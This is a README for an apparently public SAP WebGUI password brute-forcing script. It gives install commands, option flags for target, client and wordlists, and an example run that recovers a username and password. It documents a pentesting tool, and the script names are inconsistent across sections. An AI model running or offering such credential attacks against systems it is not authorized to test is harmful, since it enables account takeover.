# SAP WebGui brute-force script
This script does a simple brute-force attack against SAP WebGUI.
For that it can handle the SAP specific 'XSRF' Cookies and Request parameters.

## Installation

```bash
git clone https://gitlab.petersohn.it/jpetersohn/sap-webgui-bruteforce
cd sap-webgui-bruteforce
pip3 install -r requirements.txt

./brute_sap_webgui.py
```

## Usage

```
./sap_webgui_brute.py -h

  ___   _   ___  __      __   _               _   ___          _        __
 / __| /_\ | _ \ \ \    / /__| |__  __ _ _  _(_) | _ )_ _ _  _| |_ ___ / _|___ _ _ __ ___
 \__ \/ _ \|  _/  \ \/\/ / -_) '_ \/ _` | || | | | _ \ '_| || |  _/ -_)  _/ _ \ '_/ _/ -_)
 |___/_/ \_\_|     \_/\_/\___|_.__/\__, |\_,_|_| |___/_|  \_,_|\__\___|_| \___/_| \__\___|
                                   |___/

CAUTION: SAP allows max. 99 failed logins for a user!


usage: sap_webgui_brute.py [options]

This script does a simple Brute Force attack against SAP WebGUI. For that it can handle the SAP specific 'XSRF' Cookies and Request parameters.

optional arguments:
  -h, --help            show this help message and exit

Target:
  --sid SAP_SID         SAP System ID
  --target SERVER       IP/Hostname of Target Server
  --port PORT           HTTP Port of Target Server (default: 8000)
  --client CLIENT       Define the client to login to (default: 001)
  --url URL_PREFIX      Define URL prefix (default: sap/bc/gui/sap/its/webgui)
  --user-file USER_FILE
                        Path to file with usernames (one per line)
  --pass-file PASS_FILE
                        Path to file with password (one per line)
```
### Example:
```
./multi_brute_sap_webgui.py --sid FES --target 192.168.230.30 --user-file user.txt --pass-file passwords.txt

[*] Loading user wordlist...
[*] Loading password wordlist...
[+] Username/Password found: security:Security123
```
